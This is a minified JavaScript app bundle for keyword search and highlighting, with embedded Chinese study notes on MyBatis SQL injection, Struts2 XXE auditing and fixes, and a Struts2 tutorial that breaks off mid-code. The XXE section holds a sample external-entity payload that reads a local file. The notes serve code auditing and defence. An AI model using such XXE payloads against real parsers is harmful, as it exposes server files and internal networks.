R,k;switch(f){case"\u624B\u52A8\u679A\u4E3E\u65B9\u5F0F":{k=w[y],R=L;break}case"\u81EA\u52A8\u5B57\u7B26\u4E32\u65B9\u5F0F":{k=y,R=j;break}default:throw new Error("\u8FD9\u79CD\u60C5\u51B5\u4E0D\u5B58\u5728")}return{keywordsCfgMap:R,input_enum_or_string:k}}}]),o}(),Hu=F("6EgL"),wu=Object(S.h)(function(o,M){var y=o.cfgType,f=o.additionDescription,j=o.\u81EA\u52A8Helper_instance,R=o.showHeaders,k=R===void 0?!0:R,$=o.show_\u6A21\u7CCA\u5339\u914D,ou=$===void 0?!0:$,Bu=o.enable\u62FC\u97F3\u641C\u7D22,au=Bu===void 0?!0:Bu,mu=o.defaultOption_arr,su=o.on_\u4E0B\u62C9\u6846_\u6539\u53D8\u4E86\u9009\u9879\u5185\u5BB9,Lu=su===void 0?function(z){}:su,Ou=o.is_\u542F\u7528\u5FEB\u6377\u641C\u7D22\u7684\u6309\u94AE\u7EC4,xu=Ou===void 0?!0:Ou,Ru=o.selectTimes\u5404\u9879\u9009\u4E2D\u6B21\u6570_\u542B\u72EC\u4E00\u65E0\u4E8CID_cfg,Tu=Object(t.useState)([]),Vu=Object(D.a)(Tu,2),Iu=Vu[0],Gu=Vu[1],Pu=Object(t.useState)([]),eu=Object(D.a)(Pu,2),zu=eu[0],ku=eu[1],Xu=Object(t.useState)([]),fu=Object(D.a)(Xu,2),Qu=fu[0],d=fu[1],l=Object(t.useState)([]),_=Object(D.a)(l,2),T=_[0],J=_[1],U=Object(t.useState)(""),V=Object(D.a)(U,2),Z=V[0],Ju=V[1],vu=H.b.\u5FEB\u901F\u521B\u5EFA_\u5FEB\u901F\u641C\u7D22\u7684_state(),du=Object(D.a)(vu,2),Q=du[0],gu=du[1];xu&&H.b.bind_\u5FEB\u6377\u952E_\u641C\u7D22(function(){return Q.\u5DF2\u7ECF\u8FC7\u9009\u4E2D_options_\u5217\u8868____\u65B9\u4FBF\u505A\u4E00\u4E2ACtrlF\u67E5\u8BE2});var hu=Object(t.useRef)(null),Wu=Object(t.useState)(!0),Nu=Object(D.a)(Wu,2),u0=Nu[0],D0=Nu[1];Object(S.m)(M,function(){return{change_searchText:function(uu){var Du;F0(uu),(Du=hu.current)===null||Du===void 0||Du.set_selectFocus()}}});function F0(z){if(Ju(z),z.length!==0){var uu=z.toLowerCase(),Du=Au.\u83B7\u53D6_keywordsCfgMap(uu,y,j._\u6B63\u5219\u5173\u952E\u5B57_BeanMap),Mu=Du.keywordsCfgMap,E0=v.a.extract_keyword_from_fullTextString____\u6700\u65B0\u7684\u7591\u96BE\u6742\u75C7(uu,Mu),Yu=E0.map(function(Fu){return Fu.occurs}).flat(1).map(function(Fu){return Fu.text_index_1}),Uu=i.a.noRepeat_rtnNew(Yu);J(Uu),Ku(Uu)}}function Ku(z){if(Array.isArray(z)||alert("\u6B64\u5904\u6CE8\u610F\u903B\u8F91\uFF0C\u5E94\u8BE5\u662F\u4E00\u4E2A\u5B57\u7B26\u4E32\u6570\u7EC4\u2014\u2014\u2014\u2014\u591A\u9009"),Lu(z),xu){let Fu=function(){var yu=!1,Eu=(yu?[z[0]]:Object(O.a)(z)).filter(function(tu){return!!tu});Eu=Eu.sort(function(tu,iu){return-1*((tu==null?void 0:tu.length)-(iu==null?void 0:iu.length))}),H.a._\u79FB\u9664_\u4E4B\u524D\u7684\u5DF2\u641C\u7D22\u5173\u952E\u5B57_\u9AD8\u4EAE("\u7591\u96BE\u6742\u75C7_\u641C\u7D22"),setTimeout(function(){var tu=cu.c.\u62FC\u63A5\u591A\u4E2A\u6B63\u5219\u6216\u5B57\u7B26\u4E32__\u4E2D\u95F4\u586B\u5145\u4E3A_0\u4E2A\u548C\u4EE5\u4E0A____\u975E\u7A7A\u767D____\u6BD4\u5982\u5B57\u6BCD\u6570\u5B57\u7B26\u53F7([Object(O.a)(Eu)]);H.a.mark\u6807\u8BB0_regexp(tu,"\u7591\u96BE\u6742\u75C7_\u641C\u7D22")},.3*1e3)};gu({\u5DF2\u7ECF\u8FC7\u9009\u4E2D_options_\u5217\u8868____\u65B9\u4FBF\u505A\u4E00\u4E2ACtrlF\u67E5\u8BE2:z}),Fu()}var uu=[],Du=[],Mu=[];function E0(){}function Yu(Fu,yu){return Fu.filter(function(Eu){return Eu.relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57.includes(yu)}).map(function(Eu){return Eu.question.join(`
 ---- 
`)}).join(`
\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014
`)}function Uu(Fu){var yu=Au.\u83B7\u53D6_keywordsCfgMap(Fu,y,j._\u6B63\u5219\u5173\u952E\u5B57_BeanMap),Eu=yu.keywordsCfgMap,tu=yu.input_enum_or_string,iu=Yu(Eu,tu),n0=v.a.extract_keyword_from_fullTextString____\u6700\u65B0\u7684\u7591\u96BE\u6742\u75C7(iu,Eu.filter(function(qu){return qu.relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57.find(function($u){return $u.includes(tu)})!==void 0})),e0=v.a.extract_keyword_from_fullTextString____\u6700\u65B0\u7684\u7591\u96BE\u6742\u75C7(iu,Eu);Mu.includes(iu)||(uu.push(n0),Du.push(e0.filter(function(qu){return!n0.find(function($u){return $u.keyWCfg.name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528===qu.keyWCfg.name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528})})),Mu.push(iu))}z.forEach(function(Fu){Uu(Fu)}),J(z),Gu([].concat(uu)),ku([].concat(Du)),d([].concat(Mu)),Hu.a.getStore().dispatch_effect\u5F02\u6B65Promise_reducers\u540C\u6B65({type:"my_custom_store/sync_set____\u5F53\u524D_\u7591\u96BE\u6742\u75C7____\u5F53\u524D\u9009\u4E2D\u5173\u952E\u8BCDarr",payload:{\u5F53\u524D\u7591\u96BE\u6742\u75C7_cpKey:Ru.cp_key____\u89C6\u4E3A\u72EC\u4E00\u65E0\u4E8CKey,\u9009\u4E2D\u5173\u952E\u8BCD_arr:z}})}function C0(){var z=mu==null?void 0:mu.map(function(Du){return Du.toLowerCase()});if(z){var uu;J(z),Ku(z),(uu=hu.current)===null||uu===void 0||uu.invokeSearch_\u6700\u7EC8\u5E9F\u5F03\u4E86()}}Object(t.useEffect)(function(){C0()},[]);var B0=!0;return n.a.createElement(n.a.Fragment,null,n.a.createElement("div",null,xu&&H.b.ui_\u663E\u793A_\u641C\u7D22\u6309\u94AE(function(){return Q.\u5DF2\u7ECF\u8FC7\u9009\u4E2D_options_\u5217\u8868____\u65B9\u4FBF\u505A\u4E00\u4E2ACtrlF\u67E5\u8BE2})),n.a.createElement("div",{className:b()(s.a.questionWra,h.a.question_search_Wra)},f,u0&&n.a.createElement(lu,{ref:hu,cfgType:y,\u81EA\u52A8Helper_instance:j,onChange:Ku,onSearch:F0,searchValue:Z,enable\u62FC\u97F3\u641C\u7D22:au,valueArr:T,selectTimes\u5404\u9879\u9009\u4E2D\u6B21\u6570_\u542B\u72EC\u4E00\u65E0\u4E8CID_cfg:Ru}),B0?n.a.createElement("div",{style:{height:"0.5em"}}):n.a.createElement(n.a.Fragment,null,n.a.createElement("br",null),n.a.createElement("br",null),n.a.createElement("br",null),n.a.createElement("br",null)),n.a.createElement(G,{showHeaders:k,questionHeaders_\u5C06\u591A\u4E2A\u7ED3\u679C\u7684\u6B63\u6587_\u7EC4\u5408\u8FDE\u63A5\u5728\u4E00\u8D77_\u5728\u5934\u90E8\u989D\u5916\u663E\u793A_\u4E00\u822C\u6CA1\u5F00\u542F_arr:Qu,\u7CBE\u786E\u5339\u914D_\u591A\u4E2ABean_arr:Iu,_\u4E0B\u62C9\u9879_\u5DF2\u9009\u4E2D\u5173\u952E\u5B57_arr:T}),n.a.createElement(I,{show_\u6A21\u7CCA\u5339\u914D:ou,\u6A21\u7CCA\u5339\u914D_\u591A\u4E2ABean_arr:zu,_\u4E0B\u62C9\u9879_\u5DF2\u9009\u4E2D\u5173\u952E\u5B57_arr:T}),n.a.createElement("div",{style:{height:"40vh"}})))}),Zu=g.a=wu},Y8sb:function(P,g,F){P.exports={question_search_Wra:"question_search_Wra___1hT4t"}},Zqaa:function(P,g,F){P.exports={questionWra:"questionWra___3wwz5"}},eOgB:function(P,g,F){"use strict";F.d(g,"b",function(){return M});var O=F("fWQN"),D=F("oBTY"),t=F("qqnG"),n=F("q1tI"),v=F.n(n),u=F("/qoP"),s=F("vhfr"),S=F("XRD2"),i=F("ysNt"),p=F("z0Yr"),h,x,b,E,r,C,A,B,e,a,m,c,w,L,W,N,X,K=`
              like
                  select * from news where tile like concat(\u2018%\u2019,#{title}, \u2018%\u2019)\uFF0C
              order by
                  Mybatis\u7684order by\u8BED\u53E5\u53EF\u4EE5\u9009\u62E9\u5728java\u5C42\u505A\u6620\u5C04\u6216\u8FC7\u6EE4\u7528\u6237\u8F93\u5165\u8FDB\u884C\u9632\u5FA1\u3002
              where ... in ...
                  select * from news where id in <foreach collection="ids"item="item"open="("separator=","close=")">#{item}</foreach>

              group by

              limit

              MyBatis\u7684\u3010  <forEach>  \u6807\u7B7E\u3011\uFF0C\u4E5F\u4E0D\u80FD\u7528\u9884\u7F16\u8BD1\u3002
`,nu=`

      struts2_\u4E2D\u7684__XML_XXE__\u6CE8\u5165


          \u6F0F\u6D1E\u6210\u56E0
              XML\u6587\u6863\u7ED3\u6784\u5305\u62ECXML\u58F0\u660E\u3001DTD\u6587\u6863\u7C7B\u578B\u5B9A\u4E49\uFF08\u53EF\u9009\uFF09\u3001\u6587\u6863\u5143\u7D20\u3002\u6587\u6863\u7C7B\u578B\u5B9A\u4E49(DTD)\u7684\u4F5C\u7528\u662F\u5B9A\u4E49 XML \u6587\u6863\u7684\u5408\u6CD5\u6784\u5EFA\u6A21\u5757\u3002DTD \u53EF\u4EE5\u5728 XML \u6587\u6863\u5185\u58F0\u660E\uFF0C\u4E5F\u53EF\u4EE5\u5916\u90E8\u5F15\u7528\u3002\u5F53\u5141\u8BB8\u5F15\u7528\u5916\u90E8\u5B9E\u4F53\u65F6\uFF0C\u6076\u610F\u653B\u51FB\u8005\u5373\u53EF\u6784\u9020\u6076\u610F\u5185\u5BB9\u8BBF\u95EE\u670D\u52A1\u5668\u8D44\u6E90\u3002
              \u793A\u4F8B\uFF1A
                  <?xml version="1.0" encoding="UTF-8"?>
                      <!DOCTYPE root [
                          <!ENTITY xxe SYSTEM "file:///tmp/aaa">
                         ]>
                      <root>&xxe;</root>
              \u4F7F\u7528\u4E0D\u53EF\u4FE1\u6570\u636E\u6765\u6784\u9020XML\u4F1A\u5BFC\u81F4XML\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u5982\u679C\u7528\u6237\u88AB\u5141\u8BB8\u8F93\u5165\u7ED3\u6784\u5316\u7684XML\u7247\u6BB5\uFF0C\u5219\u4ED6\u53EF\u4EE5\u5728XML\u7684\u6570\u636E\u57DF\u4E2D\u6CE8\u5165XML\u6807\u7B7E\u6765\u6539\u5199\u76EE\u6807XML\u6587\u6863\u7684\u7ED3\u6784\u4E0E
              \u5185\u5BB9\u3002

              Java\u4E2D\u7684XXE\u652F\u6301\u4EE5\u4E0B\u534F\u8BAE\uFF1Ahttp\uFF0Chttps\uFF0Cfile\uFF0Cftp\uFF0Cmailto\uFF0Cjar\uFF0Cnetdoc\uFF0C\u53EF\u4EE5\u5229\u7528file\u534F\u8BAE\u8BFB\u53D6\u6587\u4EF6\uFF0C\u5229\u7528http\u534F\u8BAE\u63A2\u6D4B\u5185\u7F51\uFF0C\u6CA1\u6709\u56DE\u663E\u65F6\u53EF\u7EC4\u5408\u5229\u7528file\u534F\u8BAE\u548Cftp\u534F\u8BAE\u6765\u8BFB\u53D6\u6587\u4EF6\u3002\u5982\u679C\u5B58\u5728\u62A5\u9519\u7684\u60C5\u51B5\u4E0B\u8FD8\u53EF\u4EE5\u5C1D\u8BD5\u4F7F\u7528\u62A5\u9519XXE\u8FDB\u884C\u654F\u611F\u4FE1\u606F\u7684\u83B7\u53D6\u3002\u751A\u81F3\u662F\u5C1D\u8BD5\u9012\u5F52\u8C03\u7528\u9020\u6210\u62D2\u7EDD\u670D\u52A1\u653B\u51FB\u3002

          \u5BA1\u8BA1\u7B56\u7565
              XML\u89E3\u6790\u6D89\u53CA\u7684\u4E1A\u52A1\u529F\u80FD\u70B9\uFF1A WebServices\u63A5\u53E3\u3001RESTful\u63A5\u53E3\u3001Excel\u6587\u4EF6\u89E3\u6790\u3001Soap\u534F\u8BAE\u7B49\u3002

              \u6F0F\u6D1E\u89E6\u53D1\u70B9\u5C31\u5728XML\u89E3\u6790\u65F6\uFF0C\u56E0\u6B64\u91CD\u70B9\u5BA1\u8BA1XML\u89E3\u6790\u5668\u662F\u5426\u8BBE\u7F6E\u4E86\u76F8\u5173\u7684\u5B89\u5168\u5C5E\u6027\uFF0C\u7981\u7528DTDs\u6216\u8005\u7981\u6B62\u4F7F\u7528\u5916\u90E8\u5B9E\u4F53\u3002\u8FD8\u6709\u662F\u5426\u4F7F\u7528\u4E86\u4E0D\u5B89\u5168\u7684\u6F0F\u6D1E\u7EC4\u4EF6\u3002\u90E8\u5206\u89E3\u6790\u5668\u5982\u4E0B\uFF1A
                  javax.xml.parsers.DocumentBuilder
                  javax.xml.parsers.DocumentBuilderFactory
                  javax.xml.stream.XMLStreamReader
                  javax.xml.stream.XMLInputFactory
                  org.jdom.input.SAXBuilder
                  org.jdom2.input.SAXBuilder
                  org.jdom.output.XMLOutputter
                  oracle.xml.parser.v2.XMLParser
                  javax.xml.parsers.SAXParser
                  org.dom4j.io.SAXReader
                  org.dom4j.DocumentHelper
                  org.xml.sax.XMLReader
                  javax.xml.transform.sax.SAXSource
                  javax.xml.transform.TransformerFactory
                  javax.xml.transform.sax.SAXTransformerFactory
                  javax.xml.validation.SchemaFactory
                  javax.xml.validation.Validator
                  javax.xml.bind.Unmarshaller
                  javax.xml.xpath.XPathExpression
                  java.beans.XMLDecoder
              \u9664\u6B64\u4E4B\u5916\uFF0C\u5173\u6CE8StreamSource\u3001XMLConstants\u3001StringReader\u7B49\u65B9\u6CD5\u7684\u8C03\u7528\uFF0C\u5728\u9879\u76EE\u4E2D\u641C\u7D22. xsd\u6587\u4EF6\u3002

          \u5982\u4F55\u4FEE\u590D
              \u4F7F\u7528XML\u89E3\u6790\u5668\u65F6\u7981\u6B62\u4F7F\u7528\u5916\u90E8\u5B9E\u4F53\uFF1B\u4F7F\u7528\u767D\u540D\u5355\u7684\u65B9\u5F0F\u5BF9\u7528\u6237\u8F93\u5165\u8FDB\u884C\u5904\u7406\uFF0C\u907F\u514D\u7528\u6237\u8F93\u5165\u6539\u53D8XML\u7ED3\u6784\u6216\u5185\u5BB9\u3002

              \u53C2\u8003\u94FE\u63A5\uFF1AOWASP Cheat Sheet    https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java

              \u5404\u79CDFeatures\uFF1A
                  \u662F\u5426\u5141\u8BB8\u4F7F\u7528DTDS\u89E3\u6790
                      http://apache.org/xml/features/disallow-doctype-decl
                  \u662F\u5426\u5141\u8BB8\u4F7F\u7528\u901A\u7528\u5B9E\u4F53
                      http://xml.org/sax/features/external-general-entities
                  \u662F\u5426\u5141\u8BB8\u4F7F\u7528\u53C2\u6570\u5B9E\u4F53
                      http://xml.org/sax/features/external-parameter-entities
                  \u662F\u5426\u5141\u8BB8\u52A0\u8F7D\u5916\u90E8DTD\u5B9E\u4F53
                      http://apache.org/xml/features/nonvalidating/load-external-dtd
                  \u662F\u5426\u542F\u7528\u5B89\u5168\u6027\u5904\u7406
                      http://javax.xml.XMLConstants/feature/secure-processing
                  \u662F\u5426\u5141\u8BB8\u4F7F\u7528\u5916\u90E8DTD\u5B9E\u4F53
                      http://javax.xml.XMLConstants/property/accessExternalDTD
                  \u662F\u5426\u5141\u8BB8\u4F7F\u7528\u5916\u90E8Schema
                      http://javax.xml.XMLConstants/property/accessExternalSchema
                  \u662F\u5426\u5141\u8BB8\u4F7F\u7528\u5916\u90E8Stylesheet
                      http://javax.xml.XMLConstants/property/accessExternalStylesheet


  `,Cu=`
      MyBatis

          \u57FA\u672C\u7279\u5F81\uFF1A
              \u300A  $\u53F7  \u300B\uFF0C\u4EE3\u8868  \u5B57\u7B26\u4E32\u62FC\u63A5

              \u300A  #\u53F7  \u300B\uFF0C\u4EE3\u8868  \u9884\u7F16\u8BD1

          \u65E0\u6CD5\u4F7F\u7528\u9884\u7F16\u8BD1\u7684\u60C5\u51B5\uFF1A

`.concat(K,`


`),ru=[Object(u.c)("Struts2\u5F00\u53D1\u6846\u67B6\uFF0C\u8BE6\u89E3",`

  Struts2\u5F00\u53D1\u6846\u67B6\uFF0C\u8BE6\u89E3
      \u8D44\u6599\uFF1A
              \u5927\u4F53\u4ECB\u7ECD\uFF1Ahttps://www.yiibai.com/struts_2/struts2_quick_guide.html

              \u8FD8\u6CA1\u8BFB\u5B8C\uFF1A
                      \u9AD8\u4EF7\u503C\uFF1A
                              \u6700\u5168\u7684\u4E00\u7BC7\u6587\u7AE0\uFF1A
                                      https://juejin.cn/post/6844903589219926030
                              \u8F83\u5168\u7684\u4E00\u7BC7\u6587\u7AE0\uFF1A
                                      https://www.cxyzjd.com/article/weixin_43647307/121590615

                      \u5FEB\u901F\u642D\u5EFA\u4E00\u4E2A\u53EF\u7528\u5DE5\u7A0B\uFF1A
                              https://www.cnblogs.com/mindzone/p/13582170.html
                              http://www.bjpowernode.com/hot/1691.html
                      \u5404\u4E2A\u5FC5\u8981\u6A21\u5757\u7684\u4EE3\u7801\u8BB2\u89E3\uFF1Ahttps://www.jianshu.com/p/d73beaf74ab1
                      \u5E38\u89C1xml\u914D\u7F6E\u67E5\u770B\uFF1Ahttp://www.icebreakerzr.com/2018/03/11/Struts2%E5%AE%9E%E6%88%98-%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/
                      \u4E3B\u8BB2Action\u63A5\u53E3\u7684\u6700\u5C0F\u4EE3\u7801\u4E66\u5199\uFF1A
                              https://github.com/freestylefly/javaStudy/blob/master/docs/JavaEE%E6%A1%86%E6%9E%B6/Struts2/struts2%E5%85%A5%E9%97%A8&%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE.md

      \u6846\u67B6\u7279\u6027\uFF1A
              POJO\u5F62\u5F0F\u548CPOJO\u52A8\u4F5C- \u5DF2\u7ECF\u6446\u8131\u4E86Struts2\u7684\u52A8\u4F5C\u8868\u5355\u7684Struts\u6846\u67B6\u7684\u4E00\u4E2A\u7EC4\u6210\u90E8\u5206\u3002Struts2\u53EF\u4EE5\u4F7F\u7528\u4EFB\u4F55\u7684POJO\u63A5\u6536\u7684\u5F62\u5F0F\u8F93\u5165\u3002\u540C\u6837\u7684\uFF0C\u4F60\u73B0\u5728\u53EF\u4EE5\u770B\u5230\u4EFB\u4F55POJO\u7684Action\u7C7B\u3002
              Tag\u652F\u6301- Struts2\u7684\u5F62\u5F0F\u63D0\u9AD8\u4E86\u6807\u7B7E\u7684\u65B0\u6807\u7B7E\u8BA9\u5F00\u53D1\u4EBA\u5458\u5199\u66F4\u5C11\u7684\u4EE3\u7801\u3002
              AJAX\u652F\u6301- Struts2\u4E2D\u5DF2\u7ECF\u8BA4\u8BC6\u5230\u4E86Web2.0\u6280\u672F\uFF0C\u5E76\u6574\u5408\u5230\u4EA7\u54C1\u4E2DAJAX\u652F\u6301\u521B\u5EFAAJAX\u7684\u6807\u7B7E\uFF0C\u8BE5\u529F\u80FD\u975E\u5E38\u76F8\u4F3C\u7684\u6807\u51C6Struts2\u7684\u6807\u7B7E\u3002
              \u5BB9\u6613\u6574\u5408- \u4E0E\u5176\u4ED6\u6846\u67B6\u5982Spring\uFF0CTiles\u548CSiteMesh\u7684\u6574\u5408\u662F\u73B0\u5728\u66F4\u5BB9\u6613\u4E0E\u5404\u79CD\u96C6\u6210Struts2\u3002
              \u6A21\u677F\u652F\u6301- \u652F\u6301\u751F\u6210\u4F7F\u7528\u6A21\u677F\u3002
              \u63D2\u4EF6\u652F\u6301- \u6838\u5FC3Struts2\u884C\u4E3A\uFF0C\u53EF\u4EE5\u52A0\u5F3A\u548C\u6269\u5927\u4F7F\u7528\u63D2\u4EF6\u3002\u5927\u91CF\u7684\u63D2\u4EF6\u53EF\u4F9BStruts2\u3002
              \u6982\u8981\u5206\u6790- Struts2\u7684\u63D0\u4F9B\u96C6\u6210\u7684\u914D\u7F6E\uFF0C\u8C03\u8BD5\u548C\u5206\u6790\u5E94\u7528\u7A0B\u5E8F\u3002\u6B64\u5916\uFF0CStruts\u8FD8\u63D0\u4F9B\u4E86\u5185\u7F6E\u8C03\u8BD5\u5DE5\u5177\u7684\u5E2E\u52A9\u4E0B\uFF0C\u96C6\u6210\u8C03\u8BD5\u3002
              \u6807\u7B7E\u4FEE\u6539\u5BB9\u6613- \u5728Struts2\u6807\u7B7E\u6807\u8BB0\uFF0C\u53EF\u4EE5\u8C03\u6574\u4F7F\u7528FreeMarker\u6A21\u677F\u3002\u8FD9\u5E76\u4E0D\u9700\u8981JSP\u6216Java\u77E5\u8BC6\u3002\u57FA\u672C\u7684HTML\uFF0CXML\u548CCSS\u77E5\u8BC6\u662F\u4E0D\u591F\u7684\u4FEE\u6539\u7684\u6807\u7B7E\u3002
              \u63D0\u5347\u66F4\u5C11\u7684\u914D\u7F6E- Struts2\u7684\u4FC3\u8FDB\u66F4\u5C11\u7684\u914D\u7F6E\u4E0E\u7528\u4E8E\u5404\u79CD\u8BBE\u7F6E\u7684\u5E2E\u52A9\u4E0B\uFF0C\u4F7F\u7528\u9ED8\u8BA4\u503C\u3002\u4F60\u6CA1\u6709\u7684\u4E1C\u897F\uFF0C\u9664\u975E\u5B83\u504F\u79BB\u7531Struts2\u7684\u9ED8\u8BA4\u8BBE\u7F6E\u7684\u914D\u7F6E\u3002

      \u73AF\u5883\u914D\u7F6E\uFF1A
              1\u3001\u8BBE\u7F6EJAVA\u5F00\u53D1\u5DE5\u5177\u5305 (JDK)
              2\u3001\u5B89\u88C5Apache Tomcat
              3\u3001\u5B89\u88C5 Eclipse/Idea (IDE)
              4\u3001\u5B89\u88C5Struts2 \u7C7B\u5E93

      Struts 2 \u4F53\u7CFB\u7ED3\u6784\uFF1A
              1\u3001\u4ECE\u9AD8\u5C42\u6B21\u6765\u770B\uFF0CStruts2\u662F\u4E00\u4E2A\u4E0A\u62C9MVC(MVC2)\u6846\u67B6\u3002
              2\u3001\u5728Struts2\u7684Model-View-Controller\u6A21\u5F0F\u5B9E\u73B0\u4EE5\u4E0B\u4E94\u4E2A\u6838\u5FC3\u7EC4\u4EF6\uFF1A
                      Actions
                      Interceptors
                      Value Stack / OGNL
                      Results / Result types
                      View technologies
              3\u3001\u7B80\u5355\u4ECB\u7ECD  \uFF08\u673A\u7FFB\uFF09\uFF1A
                      1\u3001\u4E00\u4E2AStruts2\u7684\u8C03\u5EA6Servlet\u8FC7\u6EE4\u5668\u548C\u62E6\u622A\u5668\u4E0E\u63A7\u5236\u5668\u5B9E\u73B0\uFF0C\u8BE5\u6A21\u578B\u5B9E\u73B0\u7684\u52A8\u4F5C\u548C\u89C6\u56FE\u7684\u7EC4\u5408\u7684\u7ED3\u679C\u7C7B\u578B\u548C\u7ED3\u679C\u3002
                      2\u3001\u503C\u6808\u548COGNL\u63D0\u4F9B\u4E86\u5171\u540C\u70B9\uFF0C\u5176\u4ED6\u90E8\u4EF6\u4E4B\u95F4\u7684\u8FDE\u63A5\u548C\u96C6\u6210\u3002
                      3\u3001\u9664\u4E86\u4ECE\u4E0A\u8FF0\u7EC4\u5206\u4E2D\uFF0C\u5C06\u6709\u4E00\u4E2A\u7279\u5B9A\u7684\u4FE1\u606F\u6D89\u53CA\u5230\u914D\u7F6E\u3002\u4E3AWeb\u5E94\u7528\u7A0B\u5E8F\u7684\u914D\u7F6E\u4EE5\u53CA\u914D\u7F6E\u52A8\u4F5C\uFF0C\u62E6\u622A\u5668\uFF0C\u7ED3\u679C\u7B49\u3002
                      4\u3001\u8FD9\u662FStruts\u7684MVC\u6A21\u5F0F\u7684\u4F53\u7CFB\u7ED3\u6784\u6982\u8FF0\u3002

      \u8BF7\u6C42\u751F\u547D\u5468\u671F
              1\u3001\u7528\u6237\u53D1\u9001\u8BF7\u6C42\u5230\u670D\u52A1\u5668\uFF0C\u7528\u4E8E\u8BF7\u6C42\u5BF9\u67D0\u4E9B\u8D44\u6E90(\u5373\u9875).
              2\u3001FilterDispatcher\u6392\u7740\u773C\u4E8E\u8BE5\u8BF7\u6C42\uFF0C\u7136\u540E\u786E\u5B9A\u9002\u5F53\u7684Action.
              3\u3001\u914D\u7F6E\u62E6\u622A\u5668\u7684\u529F\u80FD\u9002\u7528\u4E8E\u5982\u9A8C\u8BC1\uFF0C\u6587\u4EF6\u4E0A\u4F20\u7B49\u3002
              4\u3001\u9009\u62E9\u7684\u52A8\u4F5C\u6267\u884C\uFF0C\u6267\u884C\u6240\u8BF7\u6C42\u7684\u64CD\u4F5C\u3002
              5\u3001\u540C\u6837\uFF0C\u914D\u7F6E\u62E6\u622A\u5668\u505A\u4EFB\u4F55\u540E\u671F\u5904\u7406\uFF0C\u5982\u679C\u9700\u8981\u7684\u8BDD\u3002
              6\u3001\u6700\u540E\u7684\u7ED3\u679C\u662F\u7531\u89C6\u56FE\u51C6\u5907\uFF0C\u5E76\u4E14\u5C06\u7ED3\u679C\u8FD4\u56DE\u7ED9\u7528\u6237\u3002

      Struts 2 \u62E6\u622A\u5668
              1\u3001\u62E6\u622A\u5668\u662F\u4F5C\u4E3AServlet\u8FC7\u6EE4\u5668\u6216JDK\u7684Proxy\u7C7B\u7684\u6982\u5FF5\u4E0A\u662F\u76F8\u540C\u7684\u3002\u62E6\u622A\u5668\u5141\u8BB8\u6A2A\u5207\u529F\u80FD\u5355\u72EC\u5B9E\u73B0\u52A8\u4F5C\u4EE5\u53CA\u6846\u67B6\u3002
              2\u3001\u4F7F\u7528\u62E6\u622A\u5668\u5728Struts2\u6846\u67B6\u63D0\u4F9B\u7684\u529F\u80FD\u5F88\u591A\uFF0C\u4F8B\u5982\u5305\u62EC\u5F02\u5E38\u5904\u7406\uFF0C\u6587\u4EF6\u4E0A\u4F20\uFF0C\u751F\u547D\u5468\u671F\u56DE\u8C03\u548C\u9A8C\u8BC1\u7B49\u3002
              3\u3001\u62E6\u622A\u5668\u7684\u6CE8\u518C\u548C\u4F7F\u7528\uFF1A
                      1\u3001\u5728\u300Astruts.xml\u300B\u4E2D\uFF0C\u6DFB\u52A0\u4EE5\u4E0B\u8BED\u6CD5\uFF1A
                              <action name="hello"
                                 class="com.yiibai.struts2.HelloWorldAction"
                                 method="execute">
                                 <interceptor-ref name="params"/>
                                 <interceptor-ref name="timer" />
                                 <result name="success">/HelloWorld.jsp</result>
                              </action>
                      2\u3001\u5728\u6B64\u57FA\u7840\u4E0A\uFF0C\u6211\u4EEC\u8FD8\u53EF\u4EE5\uFF0C\u5806\u53E0\u591A\u4E2A\u62E6\u622A\u5668\uFF1A
                              <interceptor-stack name="basicStack">
                                 <interceptor-ref name="servlet-config"/>
                                 <interceptor-ref name="prepare"/>
                                 <interceptor-ref name="params"/>
                                 <interceptor-ref name="conversionError"/>
                              </interceptor-stack>
                              <action name="hello" class="com.yiibai.struts2.MyAction">
                                 <interceptor-ref name="basicStack"/>
                                 <result>view.jsp</result>
                              </action>
              4\u3001\u4E00\u4E9B\u91CD\u8981\u7684\u62E6\u622A\u5668\uFF1B
                      alias\uFF0C\u8BF7\u6C42\u4E2D\u7684\u53C2\u6570\u522B\u540D
                      checkbox\uFF0C\u590D\u9009\u6846
                      conversionError\uFF0C\u5904\u7406\u9519\u8BEF
                      createSession\uFF0C\u81EA\u52A8\u4E3A\u8BF7\u6C42\u521B\u5EFASession
                      debugging\uFF0C\u4E3A\u5F00\u53D1\u8005\u63D0\u4F9B\u8C03\u8BD5\u754C\u9762
                      execAndWait\uFF0C\u4E3A\u7528\u6237\u53D1\u9001\u6267\u884C\u7B49\u5F85\u9875\u9762
                      exception\uFF0C\u5904\u7406\u5F02\u5E38\uFF0C\u6216\u8FDB\u884C\u91CD\u5B9A\u5411
                      fileUpload\uFF0C\u4FBF\u6377\u7684\u5904\u7406\u6587\u4EF6\u4E0A\u4F20
                      i18n\uFF0C\u56FD\u9645\u5316\u6587\u672C\u5904\u7406
                      logger\uFF0C\u65E5\u5FD7\u8BB0\u5F55
                      params\uFF0C\u5904\u7406Action\u4E2D\u7684\u53C2\u6570
                      prepare\uFF0C\u6D41\u7A0B\u5904\u7406\u524D\u7684\u524D\u7F6E\u9884\u5907\u64CD\u4F5C
                      profile\uFF0C\u5728Action\u4E2D\u8BB0\u5F55\u7B80\u5355\u7684profile\u4FE1\u606F
                      scope\uFF0C\u8BB0\u5F55Action\u7684\u72B6\u6001\u6216Session\u72B6\u6001
                      ServletConfig\uFF0C\u5904\u7406Servlet\u7684\u4FE1\u606F\u548C\u914D\u7F6E
                      timer\uFF0C\u8BB0\u5F55Action\u5904\u7406\u7684\u65F6\u957F
                      token\uFF0C\u68C0\u67E5Action\u4E2D\u7684token\u662F\u5426\u6709\u6548\uFF0C\u9632\u6B62form\u91CD\u590D\u63D0\u4EA4
                      validation\uFF0C\u63D0\u4F9B\u5BF9Action\u7684\u6821\u9A8C\u3002
              5\u3001\u521B\u5EFA\u81EA\u5B9A\u4E49\u62E6\u622A\u5668\uFF1A
                      public interface Interceptor extends Serializable{
                         void destroy();
